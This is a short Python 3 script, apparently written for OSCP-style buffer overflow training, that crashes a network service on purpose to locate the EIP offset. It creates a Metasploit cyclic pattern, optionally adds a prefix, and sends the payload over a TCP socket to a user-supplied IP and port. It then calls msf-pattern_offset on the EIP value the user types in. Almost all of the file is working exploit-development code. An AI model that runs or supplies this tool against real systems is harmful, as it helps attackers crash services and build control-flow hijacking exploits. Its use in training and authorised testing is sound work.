#!/usr/bin/python3
#Python 3 BOF EIP Offset Finder for terminal
#Credits:
#Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
#Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams

#May need to replace msf-pattern_create/msf-pattern_offset with complete path

import argparse, sys, socket, subprocess

args = argparse.ArgumentParser(usage='%(prog)s -i <IP> -p <PORT> --prefix <Optional> -b <Optional>')
args.add_argument("-i", "--ip", required=True, help="IP Address")
args.add_argument("-p", "--port", type=int, required=True, help="Port")
args.add_argument("--prefix", help="String prefixed to the payload")
args.add_argument("-b", "--bytes", type=int, required=True, help="Payload size as reported by Fuzzer. Add some padding.") 
args = vars(args.parse_args())

ip = args["ip"]
port= args["port"]
try:
	socket.inet_aton(ip)
	host = (ip,port)
except:
	sys.exit("Invalid IP Address.")

crash_bytes = str(args["bytes"])

pattern = subprocess.run(['msf-pattern_create', '-l', crash_bytes], stdout=subprocess.PIPE).stdout

if args["prefix"]:
	prefix = args["prefix"].encode()
else:
	prefix = b''

payload = prefix + pattern

with socket.socket(socket.AF_INET, socket. SOCK_STREAM) as s:
	s.settimeout(2)
	s.connect(host)
	s.recv(1024) 
	print("Sending patterned payload.")
	s.send(payload)

eip_value = input("Value of EIP: ")
exact_offset = subprocess.run(['msf-pattern_offset', '-l', crash_bytes, '-q', eip_value], stdout=subprocess.PIPE).stdout.decode()
print(exact_offset)
